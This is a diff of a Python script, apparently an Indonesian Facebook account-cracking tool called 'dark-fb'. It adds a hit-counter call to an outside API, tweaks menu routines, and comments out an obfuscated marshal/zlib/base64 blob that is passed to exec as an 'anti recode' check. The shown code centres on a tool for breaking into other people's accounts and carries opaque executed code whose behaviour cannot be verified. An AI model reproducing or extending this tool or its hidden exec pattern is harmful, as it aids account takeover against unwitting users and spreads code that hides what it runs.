@@ -99,6 +99,7 @@ from requests.exceptions import ConnectionError
 from datetime import datetime
 from urllib.parse import quote
 from datetime import date
+from urllib import request
 #from get_useragents import useragents
 #ua_lo = useragents.UserAgents(limit=2000)
 
@@ -172,7 +173,8 @@ jamz = datetime.now().strftime('%H:%M:%S')
 jam_ = datetime.now().strftime('%H%M%S')
 jam__ = str(datetime.now().strftime("%d%m%Y"))
 sys.stdout.write(f'\x1b[1;35m\x1b]2; ★ SCRIPT BY MR.RISKY ★\x07')
-
+visitor=request.urlopen("https://api.countapi.xyz/hit/dumai-991/dark-fb")
+ka=json.loads(visitor.read())
 
 
 
@@ -281,11 +283,11 @@ class Main():
 
 
 		code="""Wans X Gans
-	Jeck X Nano
-	Xenzi Ganz
-	Radhin Al Haady
-	Zee K World
-	Moch Aang Ardiansyah XD"""
+Jeck X Nano
+Xenzi Ganz
+Radhin Al Haady
+Zee K World
+Moch Aang Ardiansyah XD"""
 		pyhon = Syntax(code, "python", theme="monokai", line_numbers=True)
 		my_rrrr=my_r.add(f"\r{b}My Team{q}")
 		my_rrrr.add(Group(pyhon))
@@ -323,8 +325,8 @@ class Main():
 		prints(my__)
 
 
-		try:open("data/kata","r").read()
-		except:open("data/kata","w").write("#SELAMAT DATANG, TERIMA KASIH TELAH LIHAT");kotak(f"# SELAMAT DATANG PENGGUNA BARU !!", K, C)
+		try:open("data/kata","r").read();print(f"{q}╔══════════════════════════════════════════════════════════════════════════════════════╗\n║                               {i}SELAMAT DATANG YANG KE{k} {ka['value']} {q}                             ║\n╚══════════════════════════════════════════════════════════════════════════════════════╝")
+		except:open("data/kata","w").write("# SELAMAT DATANG, TERIMA KASIH TELAH LIHAT");kotak(f"# SELAMAT DATANG PENGGUNA BARU !!", K, C)
 
 
 		top = f"""01
@@ -369,8 +371,8 @@ Log Out Dari Akun (Keluar)"""
 		self.pilihan()
 	def pilihan(self):
 		ki = input(f'>--Pilih 1-8--> ')
-		if ki in ["1","01"]:self.public_v2();os.sys.exit()
-#		if ki in ["1","01"]:self.public();os.sys.exit()
+#		if ki in ["1","01"]:self.public_v2();os.sys.exit()
+		if ki in ["1","01"]:self.public();os.sys.exit()
 		elif ki in ["2","02"]:self.public_mass();os.sys.exit()
 		elif ki in ["3","03"]:self.follow();os.sys.exit()
 		elif ki in ["4","04"]:self.random_email();os.sys.exit()
@@ -2344,8 +2346,14 @@ class bot_facebook:
 			return(hasil_)
 AnTi_rIkOd="Self"
 # BOT CHECK FILE ANTI RIKOD
-_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'vd3JYDA/a8/36/GzPUyIwPf7d3FO95q47nu/rzJGw9y1Y6Z2tQiuwZ28QsWY2pocbqeeUbW6od2jym2Eei8I40eKUC08KIm9Olf7KnGLsYSljFX1R8AOX2mvCnmC1VscQjs0WoOAjuVHj+mUWFMISdaS6of1vmIyu60FkLn6m2Eqh7VBnvUwEJ2/g5oPHPeVyf0atVzOCGSO1O52Jswhd82B2HsvF+B75WZljhLLfOmpEgvrr0wsarZprypz62cXGF+2D03jwG6s3w7ilibs0Y/tVBUkp5DTI22diGrtjgrWacQBbcObTKFDVP+5voVPVZBmcXvXhFNRnWkhpigHRevPW00orolT6cthr4L5iZFPy2qrzxNAyowg3QwshEghPlpPIwEIIM76qe2jzs4t43ivfVcvq/bpRXZxcUKeTb9wMQAMBaDNkELsRLTGSgBYpoWVnMGSEgFsXXqwovZRAA0gSlEkdxJe'))
+#_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'vd3JYDA/a8/36/GzPUyIwPf7d3FO95q47nu/rzJGw9y1Y6Z2tQiuwZ28QsWY2pocbqeeUbW6od2jym2Eei8I40eKUC08KIm9Olf7KnGLsYSljFX1R8AOX2mvCnmC1VscQjs0WoOAjuVHj+mUWFMISdaS6of1vmIyu60FkLn6m2Eqh7VBnvUwEJ2/g5oPHPeVyf0atVzOCGSO1O52Jswhd82B2HsvF+B75WZljhLLfOmpEgvrr0wsarZprypz62cXGF+2D03jwG6s3w7ilibs0Y/tVBUkp5DTI22diGrtjgrWacQBbcObTKFDVP+5voVPVZBmcXvXhFNRnWkhpigHRevPW00orolT6cthr4L5iZFPy2qrzxNAyowg3QwshEghPlpPIwEIIM76qe2jzs4t43ivfVcvq/bpRXZxcUKeTb9wMQAMBaDNkELsRLTGSgBYpoWVnMGSEgFsXXqwovZRAA0gSlEkdxJe'))
 
+if AnTi_rIkOd=="Self":
+	sistim="Aman"
+else:
+	os.system("clear")
+	kotak("# TOBAT GOBLOG UDAH BESAR MASIH RIDOD SC ORANG",M,I)
+	os.sys.exit()
 
 
 
@@ -2396,4 +2404,3 @@ class Main_:
 
 Main_()._no_vpn()
 #cek_apk_hasil_crk()
-
